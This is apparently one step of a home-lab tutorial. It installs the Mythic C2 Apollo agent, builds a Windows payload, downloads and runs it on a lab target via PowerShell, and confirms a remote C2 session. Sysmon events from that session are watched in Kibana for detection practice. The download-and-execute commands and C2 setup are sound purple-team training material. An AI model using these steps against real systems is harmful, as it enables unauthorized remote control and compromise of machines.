# Step 22 — Install Apollo Agent, Generate Payload + Confirm C2 Callback

## Objective
Install the Apollo agent and HTTP C2 profile on the Mythic server, generate a Windows payload, transfer it to the Windows target, execute it, and confirm an active C2 callback in the Mythic web UI — completing the attacker-side setup of the simulated attack chain.

---

## Prerequisites
- Mythic C2 server is running on VM4 
- VM1 (ELK + Fleet) is running — keep Kibana open during this step to observe
  Sysmon telemetry arriving in real time as the payload executes
- Kali Linux VM is ready to RDP brute force into Windows Target (for emulating C2 attack chain)

> ⚠️ **Strictly educational.** All activity in this step is performed entirely within an isolated local VMware lab. No external systems, networks, or real infrastructure are involved at any point.

---

## Step 1 — Install the Apollo agent on Mythic (VM4)

SSH into VM4 and navigate to the Mythic directory:

```bash
cd ~/Mythic
```

Install the Apollo agent using `mythic-cli`:

```bash
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
```

This pulls the Apollo agent Docker container and registers it with Mythic. The install takes 2–5 minutes.

Verify in the Mythic web UI:

1. Click the **Payload Types** icon (☣️) in the left sidebar
2. **Apollo** should appear in the list with a green status indicator

---

## Step 2 — Install the HTTP C2 profile on Mythic (VM4)

```bash
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

Verify in the Mythic web UI:
1. Click the **C2 Profiles** icon in the left sidebar
2. **http** should appear in the list with a green status indicator

---

## Step 3 — Open port 80 on VM4 for C2 callbacks

The Apollo agent will call back to Mythic on port 80 (HTTP). Allow this through the VM4 firewall:

```bash
sudo ufw allow 80
sudo ufw status
# Port 80 should show: ALLOW Anywhere
```

---

## Step 4 — Generate the Apollo payload (Mythic web UI)

1. In the Mythic web UI, click **Payloads** → **Generate New Payload**
2. Configure the payload:

| Setting | Value |
|---|---|
| Target OS | Windows |
| Payload type | Apollo |
| Output format | WinExe |
| C2 Profile | http |
| Callback host | `http://172.31.0.134` |
| Callback port | `80` |
| Callback interval | `10` (seconds) |
| Callback jitter | `0` |

3. Leave all other settings at default
4. Click **Next** through the commands selection — keep defaults
5. Give the payload a description: `Lab test payload - Windows VM2`
6. Click **Create Payload**

Mythic builds the payload — this takes 30–60 seconds. When complete, a download button appears next to the payload in the Payloads list.

> **Payload filename:** Note the exact filename Mythic generates (e.g. `Apollo_http_x64.exe`). You will need this when transferring to VM2. 

---

## Step 5 — Serve the payload via Python HTTP server (VM4)

Download the payload from the Mythic UI to VM4 first, then serve it:

```bash
# Navigate to the directory where you downloaded the payload
cd ~

# Start a Python HTTP server on port 9999
python3 -m http.server 9999
```

Allow port 9999 through UFW temporarily for the transfer:
```bash
# In a second terminal on VM4
sudo ufw allow 9999
```

Leave the Python server running — you'll stop it after the transfer.

---

## Step 6 — Transfer the payload to VM2 (Windows target)

**Open Windows VM2, or use Kali Linux to RDP into the target (this emulates C2 attack chain).** Once logged in as Administrator, open PowerShell and download the payload:

```powershell
# Download the payload from the Mythic HTTP server
Invoke-WebRequest -Uri "http://172.31.0.134:9999/Apollo_http_x64.exe" `
  -OutFile "C:\Users\Administrator\Desktop\Apollo_http_x64.exe"
```

Confirm the file downloaded:
```powershell
ls C:\Users\Administrator\Desktop\
# Apollo_http_x64.exe should be listed
```

---

## Step 7 — Execute the payload on VM2

In PowerShell on VM2, run the payload:

```powershell
C:\Users\Administrator\Desktop\Apollo_http_x64.exe
```

The terminal will appear to hang — this is expected. The payload is running in the foreground and beaconing back to VM4 on port 80.

> **Keep this PowerShell window open** — closing it terminates the C2 session.

---

## Step 8 — Confirm the callback in Mythic (VM4)

Switch to the Mythic web UI in your Windows host browser:

1. Click the **Callbacks** icon (📋) in the left sidebar
2. Within 10–30 seconds, a new entry should appear showing:
   - **Host:** `WIN-KT9TVSF1T0C` (or VM2's hostname)
   - **User:** `Administrator`
   - **IP:** `172.31.0.20`
   - **Agent:** Apollo
   - **Last checkin:** a few seconds ago

---

## Step 9 — Interact with the C2 session

Click on the callback entry in Mythic to open the **Interact** window.
Run a test command to confirm the session is fully operational:

```
whoami
```

Expected output: `WIN-KT9TVSF1T0C\administrator` (or similar)

Run a few more discovery commands to generate Sysmon telemetry for detection in later steps:

```
ipconfig
net user
```

> Every command run here generates **Sysmon Event ID 1** (process creation) on VM2 and will be visible in Kibana. Keep Kibana Discover open on another screen to watch the events arrive in real time.

---

## Screenshots to save

| Filename | What to capture |
|---|---|
| `diagrams/step22-apollo-installed.png` | Mythic Payload Types page showing Apollo |
| `diagrams/step22-http-profile-installed.png` | Mythic C2 Profiles page showing HTTP |
| `diagrams/step22-payload-generated.png` | Mythic Payloads list showing the generated payload |
| `diagrams/step22-mythic-callback.png` | Mythic Active Callbacks page showing VM2 connected |
| `diagrams/step22-whoami-output.png` | Mythic interact window showing whoami result |


---

## Key takeaway
Seeing a C2 callback in Mythic and simultaneously watching Sysmon Event ID 1 and 3 arrive in Kibana in real time is the most powerful moment in the entire challenge — it makes the attacker/defender duality completely concrete. The same action (Apollo payload executing) produces two simultaneous views: the attacker sees an interactive shell in Mythic, and the defender sees anomalous process creation and outbound network activity in the SIEM. 

---



## VM status at end of step

| VM | Status |
|---|---|
| ELK + Fleet (VM1) | ✅ Running — Elasticsearch :9200, Kibana :5601, Fleet :8220 |
| Windows target (VM2) | ✅ Running — Apollo payload executing, C2 session active |
| Ubuntu target (VM3) | ⏸ Suspended — not needed |
| Mythic C2 (VM4) | ✅ Running — active callback confirmed in Mythic UI |
| osTicket (host) | Not yet installed |